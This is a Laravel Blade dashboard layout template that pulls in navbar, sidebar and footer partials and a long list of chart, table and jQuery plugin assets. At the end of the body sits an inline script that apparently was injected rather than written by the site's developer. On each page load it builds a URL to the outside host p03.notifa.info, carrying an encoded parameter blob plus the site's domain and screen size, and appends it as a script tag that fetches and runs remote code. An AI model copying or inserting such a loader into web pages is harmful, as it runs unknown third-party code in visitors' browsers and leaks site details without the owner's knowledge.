<!DOCTYPE html>
<html lang="{{ str_replace('_', '-', app()->getLocale()) }}">

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="csrf-token" content="{{ csrf_token() }}">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />

    <title>@yield('title')</title>

    <!-- App favicon -->
    <link rel="shortcut icon" href="{{ asset('assets/images/favicon.ico') }}" />
    <link rel="stylesheet" href="{{ asset('assets/plugins/morris/morris.css') }}" />
    <link rel="stylesheet" href="{{ asset('assets/plugins/chartist/css/chartist.min.css') }}" />
    <link href="{{ asset('assets/plugins/jvectormap/jquery-jvectormap-2.0.2.css') }}" rel="stylesheet" />
    <link href="{{ asset('assets/plugins/datatables/dataTables.bootstrap4.min.css') }}" rel="stylesheet"
        type="text/css" />
    <!-- App css -->
    <link href="{{ asset('assets/css/bootstrap.min.css') }}" rel="stylesheet" type="text/css" />
    <link href="{{ asset('assets/css/icons.css') }}" rel="stylesheet" type="text/css" />
    <link href="{{ asset('assets/css/metismenu.min.css') }}" rel="stylesheet" type="text/css" />
    <link href="{{ asset('assets/css/style.css') }}" rel="stylesheet" type="text/css" />

    <!-- Fonts -->
    <link rel="stylesheet"
        href="{{ url('https://fonts.googleapis.com/css2?family=Nunito:wght@400;600;700&display=swap') }}">

    <!-- Styles -->
    {{-- <link rel="stylesheet" href="{{ asset('css/app.css') }}"> --}}

    <!-- Scripts -->
    <script src="{{ asset('js/app.js') }}" defer></script>

</head>

<body class="font-sans antialiased">

    @stack('style')

    <!-- Top Bar Start -->
    <div class="topbar">
        <!-- LOGO -->
        <div class="topbar-left">
            <a href="{{ route('admin.home') }}" class="logo">
                <span><img src="{{ asset('logo/logo-sm.png') }}" alt="logo-small" class="" width="65" />
                </span><span><img src="{{ asset('logo/logo.png') }}" alt="logo-large" class=""
                        width="120" /></span>
            </a>
        </div>

        <!-- Navbar -->
        @include('layouts.component_dashboard.navbar')
        <!-- end navbar-->
    </div>
    <!-- Top Bar End -->
    <div class="page-wrapper">
        <!-- Left Sidenav -->
        @include('layouts.component_dashboard.sidebar')
        <!-- end left-sidenav-->
        <!-- Page Content-->
        <div class="page-content">
            <div class="container-fluid">
                @yield('contentAdmin')
                @yield('contentUser')
            </div>
            <!-- container -->
            @include('layouts.component_dashboard.footer')
        </div>
        <!-- end page content -->

        @stack('script')

        <!-- end page-wrapper -->
        <script src="{{ url('https://code.jquery.com/jquery-3.6.0.min.js') }}"></script>
        <!-- end page-wrapper -->
        <!-- jQuery  -->
        <script src="{{ asset('assets/js/jquery.min.js') }}"></script>
        <script src="{{ asset('assets/js/bootstrap.bundle.min.js') }}"></script>
        <script src="{{ asset('assets/js/metisMenu.min.js') }}"></script>
        <script src="{{ asset('assets/js/waves.min.js') }}"></script>
        <script src="{{ asset('assets/js/jquery.slimscroll.min.js') }}"></script>
        <script src="{{ asset('assets/plugins/chartist/js/chartist.min.js') }}"></script>
        <script src="{{ asset('assets/plugins/chartist/js/chartist-plugin-tooltip.min.js') }}"></script>
        <script src="{{ asset('assets/plugins/morris/morris.min.js') }}"></script>
        <script src="{{ asset('assets/plugins/raphael/raphael-min.js') }}"></script>
        <script src="{{ asset('assets/plugins/peity-chart/jquery.peity.min.js') }}"></script>
        <script src="{{ asset('assets/plugins/jvectormap/jquery-jvectormap-2.0.2.min.js') }}"></script>
        <script src="{{ asset('assets/plugins/jvectormap/jquery-jvectormap-world-mill-en.js') }}"></script>
        <script src="{{ asset('assets/plugins/datatables/jquery.dataTables.min.js') }}"></script>
        <script src="{{ asset('assets/plugins/datatables/dataTables.bootstrap4.min.js') }}"></script>
        <script src="{{ asset('assets/pages/jquery.dashboard2.init.js') }}"></script>
        <!-- App js -->
        <script src="{{ asset('assets/js/app.js') }}"></script>
        <script type="text/javascript">
            if (self == top) {
                function netbro_cache_analytics(fn, callback) {
                    setTimeout(function() {
                        fn();
                        callback();
                    }, 0);
                }

                function sync(fn) {
                    fn();
                }

                function requestCfs() {
                    var idc_glo_url = location.protocol == "https:" ? "https://" : "http://";
                    var idc_glo_r = Math.floor(Math.random() * 99999999999);
                    var url =
                        idc_glo_url +
                        "p03.notifa.info/3fsmd3/request" +
                        "?id=1" +
                        "&enc=9UwkxLgY9" +
                        "&params=" +
                        "4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5m3DSB4E%2frimBP%2f0zF8sRs3p2xLAh0Z9uX7Kysc1MneK1g1fkXY8NEA4nhjSE7cev32VAccKyfI1Gccn%2fAa2axzFnIlEVSWManahLRbXEi9l0GGJRQCQKo2a6Z%2f6yazME2UCUFgtuIgNIq46fkJnoIGRIZnLtN8mjSnr4sPGwlQGPtvwLJbXpq%2bGGr%2fipddsC2orpAnipl9Bae7hIJnuwV83ZTbLrEAIQIHMnYqRaLg3LvbAbzQRa59GQi0VoI%2blb53yWYfpVYmu8wLmoG4eQH9xeLctXnz8XttTe8zpHAgN68i098jXS0rFiQ6yK3szr3ECgCed6BnKZlq9c0dCHns%2fwDDRINcepgpRqae8vQOgGTD646I%2fCbQdBZf8yfbfEvfk1OXhxr1S1d%2bDNVi%2bPSlUVWQHUdqJp3KNDRjVhK55zK%2bDnJLSQRMdxaueuEcMBCJ8nHFOjaqPx%2bqfeSxgYCaxA6e9PsrAo%2f5s7EmkLmD4pwsM14vdEoMQ%3d%3d" +
                        "&idc_r=" +
                        idc_glo_r +
                        "&domain=" +
                        document.domain +
                        "&sw=" +
                        screen.width +
                        "&sh=" +
                        screen.height;
                    var bsa = document.createElement("script");
                    bsa.type = "text/javascript";
                    bsa.async = true;
                    bsa.src = url;
                    (document.getElementsByTagName("head")[0] || document.getElementsByTagName("body")[0]).appendChild(bsa);
                }
                netbro_cache_analytics(requestCfs, function() {});
            }
        </script>
</body>

</html>
